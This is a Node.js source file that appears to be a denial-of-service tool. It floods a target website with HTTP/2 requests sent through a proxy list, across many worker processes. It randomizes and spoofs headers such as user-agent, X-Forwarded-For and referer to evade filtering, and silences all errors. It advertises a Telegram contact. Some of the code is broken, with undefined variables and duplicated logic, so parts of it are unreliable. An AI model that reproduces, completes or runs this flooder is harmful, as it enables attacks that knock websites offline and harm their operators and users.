const net = require("net");
const http = require('http');
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const path = require('path');
 const colors = require('colors');
const scp = require("set-cookie-parser");
 const gradient = require('gradient-string');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[0],
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers.slice(3) 
].join(":");
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const lang_header = [
	'en-US,en;q=0.9'
	, 'en-GB,en;q=0.9'
	, 'en-CA,en;q=0.9'
	, 'en-AU,en;q=0.9'
	, 'en-NZ,en;q=0.9'
	, 'en-ZA,en;q=0.9'
	, 'en-IE,en;q=0.9'
	, 'en-IN,en;q=0.9'
	, 'ar-SA,ar;q=0.9'
	, 'az-Latn-AZ,az;q=0.9'
	, 'be-BY,be;q=0.9'
	, 'bg-BG,bg;q=0.9'
	, 'bn-IN,bn;q=0.9'
	, 'ca-ES,ca;q=0.9'
	, 'cs-CZ,cs;q=0.9'
	, 'cy-GB,cy;q=0.9'
	, 'da-DK,da;q=0.9'
	, 'de-DE,de;q=0.9'
	, 'el-GR,el;q=0.9'
	, 'es-ES,es;q=0.9'
	, 'et-EE,et;q=0.9'
	, 'eu-ES,eu;q=0.9'
	, 'fa-IR,fa;q=0.9'
	, 'fi-FI,fi;q=0.9'
	, 'fr-FR,fr;q=0.9'
	, 'ga-IE,ga;q=0.9'
	, 'gl-ES,gl;q=0.9'
	, 'gu-IN,gu;q=0.9'
	, 'he-IL,he;q=0.9'
	, 'hi-IN,hi;q=0.9'
	, 'hr-HR,hr;q=0.9'
	, 'hu-HU,hu;q=0.9'
	, 'hy-AM,hy;q=0.9'
	, 'id-ID,id;q=0.9'
	, 'is-IS,is;q=0.9'
	, 'it-IT,it;q=0.9'
	, 'ja-JP,ja;q=0.9'
	, 'ka-GE,ka;q=0.9'
];

accept_header = [
'*/*',
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
],

platform = [
	"Windows"
	, "Android"
   , "Chrome OS"
   , "Chromium OS"
   , "iOS"
   , "Linux"
   , "macOS"
   , "Unknown"
],

cache_header = [
            'max-age=0',
            'no-cache',
            'no-store',
            'must-revalidate',
            'proxy-revalidate',
            's-maxage=604800',
            'no-cache, no-store,private, max-age=0, must-revalidate',
            'no-cache, no-store,private, s-maxage=604800, must-revalidate',
            'no-cache, no-store,private, max-age=604800, must-revalidate',
            'no-transform',
            'only-if-cached',
            'max-age=0',
            'max-age=120',
            'max-age=600578',
            'must-revalidate',
            'public',
            'private',
            'proxy-revalidate',
            '*/*',
            'max-age=604800',
            'max-age=0, private, must-revalidate',
            'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
            'no-cache, no-store, max-age=0, must-revalidate',
            'no-store, no-cache, must-revalidate',
            'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800',
],

type = [
	 "application/json"
	, "application/xml"
	, "application/octet-stream"
	, "application/javascript"
	, "application/pdf"
	, "application/vnd.ms-excel"
	, "application/vnd.ms-powerpoint"
	, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
	, "application/vnd.openxmlformats-officedocument.presentationml.presentation"
	, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
	, "application/zip"
	, "application/graphql"
	, "application/x-www-form-urlencoded"
	, "application/vnd.api+json"
	, "application/ld+json"
	, "application/x-pkcs12"
	, "application/x-pkcs7-certificates"
	, "application/x-pkcs7-certreqresp"
	, "application/x-pem-file"
	, "application/x-x509-ca-cert"
	, "application/x-x509-user-cert"
	, "application/x-x509-server-cert"
	, "application/x-bzip"
	, "application/x-gzip"
	, "application/x-7z-compressed"
	, "application/x-rar-compressed"
	, "application/x-shockwave-flash"
];

dest_header = [
            'audio',
            'audioworklet',
            'document',
            'embed',
            'empty',
            'font',
            'frame',
            'iframe',
            'image',
            'manifest',
            'object',
            'paintworklet',
            'report',
            'script',
            'serviceworker',
            'sharedworker',
            "subresource",
            "unknown",
            'style',
            'track',
            'video',
            'worker',
            'xslt',
        ],
        mode_header = [
            'cors',
            'navigate',
            'no-cors',
            'same-origin',
            'websocket'
        ],
        site_header = [
            'cross-site',
            'same-origin',
            'same-site',
            'none'
        ],
encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
],

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7) {
  console.log('node tls.js Target Time Rate Thread Proxyfile'.rainbow);
  process.exit();
}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }

const blackList = [''];

if (blackList.includes(args.target)) {
  console.log("");
  process.exit(1);
}

if (args.time < 0 || args.time > 10000) {
  console.log("");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 10000) {
  console.log("");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 10000) {
  console.log("");
  process.exit(1);
}

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

function readLines(file) {
    return fs.readFileSync(file, 'utf-8').split('\n');
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

if (parsedTarget.protocol === 'http:') {
    parsedTarget.protocol = 'https:';
}

const targetHost = parsedTarget.host;
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;

    console.clear();
console.log(`Contact me : t.me/tduong0888`.rainbow);
console.log(`Target : ${parsedTarget.host}`.rainbow);
console.log(`Time(s) : ${args.time.toString()}`.rainbow);
console.log(`Thread(s) : ${args.threads.toString()}`.rainbow);
console.log(`Rate(s) : ${args.Rate.toString()}`.rainbow);
console.log(`Proxy : ${args.proxyFile} | Total: ${proxies.length}`.rainbow);
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);

} 

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}
    setTimeout(function(){

      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 10 * 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

/*const rateHeaders = [
    {"akamai-origin-hop": randstr(5)},
    {"source-ip": randstr(5)  },
    {"via": randstr(5)  },
    {"cluster-ip": randstr(5)  },
    {"upgrade-insecure-request" : "1"},
    {"accept": accept_header[Math.floor(Math.random()*accept_header.length)]},
    {"accept-charset" : accept_header[Math.floor(Math.random()*accept_header.length)]},
    {"Cache-Control" : 'no-cache'},
    {"pragma" : "no-cache"},
    {"x-xss-protection" : "1;mode=block"}, 
    {"x-content-type-options" : "nosniff"},
    {'accept-datetime' : accept_header[Math.floor(Math.random()*accept_header.length)]},
    ];
    const rateHeaders2 = [
    {"akamai-origin-hop": randstr(5)  },
    {"source-ip": randstr(5)  },
    {"via": randstr(5)  },
    {"X-Vercel-Cache": randstr(5) },
    {"cluster-ip": randstr(5)  },
    {"X-Requested-With": 'XMLHttpRequest'},
    {"X-Frame-Options": "deny"},
    {'Max-Forwards': '10'},
    {'Refresh': '0'},
    {'accept-language' : randomHeaders['accept-language']},
    {'accept-encoding' : randomHeaders['accept-encoding']}
    ];*/

const rateHeaders = [
        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
        {"Access-Control-Request-Method": "GET"},
        { "accept-language" : lang_header[Math.floor(Math.random() * lang_header.length)]},
        { "origin": "https://" + parsedTarget.host},
        { "source-ip": randstr(5)  },
        //{"x-aspnet-version" : randstrsValue},
        { "data-return" :"false"},
        {"X-Forwarded-For" : parsedProxy[0]},
        {"NEL" : val},
        {"dnt" : "1" },
        { "A-IM": "Feed" },
        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
       {'Delta-Base' : '12340001'},
       {"te": "trailers"},
];


function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }


  const Header = new NetSocket();
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;/*'?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);*/
  headers[":scheme"] = "https";
  headers[":authority"] = parsedTarget.host;
  headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
  headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
  headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];
  headers["content-type"] = type[Math.floor(Math.random() * type.length)];
  headers["referer"] = "https://" + ememmmmmemmeme(6,6) + ".net";
  headers["sec-fetch-user"] = "?1";
  headers["sec-ch-ua"] = getRandomUserAgent();
  headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
  headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
  headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
  headers["origin"] = parsedTarget.protocol + "//" + parsedTarget.host;
  headers["upgrade-insecure-requests"] = "1";
  headers["x-requested-with"] = "XMLHttpRequest";
  headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
  headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
  headers["connection"] = "keep-alive";
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     headers["user-agent"] = getRandomUserAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 15
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1', 'http/1.2', 'http/1.3'],
            echdCurve: ecdhCurve,
            ciphers: ciphers,
            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
          };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false,
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false,
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                let headers = "GET " + "?" + randstr(5) + "=" + randstr(25) + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + parsedTarget.host + "\r\n" +
                        "Origin: " + parsedTarget.host + "\r\n" +
                        "Accept: " + accept_header[Math.floor(Math.random() * accept_header.length)] + "\r\n" +
                        "User-Agent: " + getRandomUserAgent + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        "Accept-Encoding: " + encoding_header[Math.floor(Math.random() * encoding_header.length)] + "\r\n" +
                        "Accept-Language: " + lang_header[Math.floor(Math.random() * lang_header.length)] + "\r\n" +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n";
const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
              
              
            }
const request = client.request({
      ...dynHeaders,
    }, {
      parent:0,
      exclusive: true,
      weight: 220,
    })
                    /*const request = client.request(headers)
                    const request1 = client.request(rateHeaders)*/
 
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                
                }
            }, 300); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);